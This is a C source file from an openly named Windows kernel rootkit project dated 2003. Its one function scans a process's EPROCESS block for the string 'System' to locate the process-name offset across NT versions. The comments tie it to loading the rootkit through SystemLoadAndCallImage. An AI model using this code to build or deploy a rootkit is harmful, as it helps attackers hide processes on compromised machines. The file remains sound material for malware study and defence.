///////////////////////////////////////////////////////////////////////////////////////
// Filename ProcessName.c
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: Finds the offset of the process name within an EPROCESS block.
//
// Date:    5/27/2003
// Version: 1.0


#include "ntddk.h"
#include "Rootkit.h"
#include "ProcessName.h"


///////////////////////////////////////////////////////////////////
// ULONG GetLocationOfProcessName
// Parameters:
//       IN PEPROCESS    pointer to the kernel process block of 
//						 the current process
// Returns:
//		 OUT ULONG		 offset of process name in EPROCESS structure
//     
// Description: Gets the location if the name of the process in the 
//				kernel process block. This is done because EPROCESS
//				changes between versions of NT/2000/XP. This technique
//				was first done by Sysinternals. They rock! But my
//				function is different because it can be called at anytime
//				not just at DriverEntry. Using my method, you can load the 
//				rootkit using SystemLoadAndCallImage as was discovered by 
//				Greg Hoglund.
//
// Note:        The reason this works is because it walks the list of
//				processes looking in the EPROCESS block for the string
//				"System".

ULONG GetLocationOfProcessName(PEPROCESS CurrentProc)
{
    ULONG ul_offset;
//	PLIST_ENTRY plist_active_procs;

//	while(1)
//	{
		for(ul_offset = 0; ul_offset < PAGE_SIZE; ul_offset++) // This will fail if EPROCESS grows bigger than PAGE_SIZE
		{
			if( !strncmp( "System", (PCHAR) CurrentProc + ul_offset, strlen("System")))
			{
				return ul_offset;
			}
		}

//		plist_active_procs = (LIST_ENTRY *) ((DWORD)CurrentProc+FLINKOFFSET);
//		(DWORD)CurrentProc = (DWORD) plist_active_procs->Flink;
//		(DWORD)CurrentProc = (DWORD) CurrentProc - FLINKOFFSET;
//	}

	return (ULONG) 0;
}

